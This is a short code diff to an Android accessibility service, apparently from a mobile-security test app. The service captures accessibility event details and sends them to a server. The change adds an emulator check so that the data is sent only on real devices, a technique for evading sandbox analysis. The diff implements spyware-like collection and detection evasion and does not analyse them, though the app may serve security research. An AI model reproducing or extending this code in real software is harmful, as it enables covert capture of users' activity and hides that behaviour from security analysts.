@@ -4,6 +4,7 @@ import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
+import com.example.testmobsec.util.EmulCheck
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.launch
@@ -30,7 +31,9 @@ class MyAccessibilityService : AccessibilityService() {
                     put("Timestamp", timestamp)
                 }
                 GlobalScope.launch(Dispatchers.IO) {
-                sendDetailsToServer(details)
+                    if (!EmulCheck.isRunningOnEmulator()) {
+                        sendDetailsToServer(details)
+                    }
                 }
             }
             // Handle other event types if needed
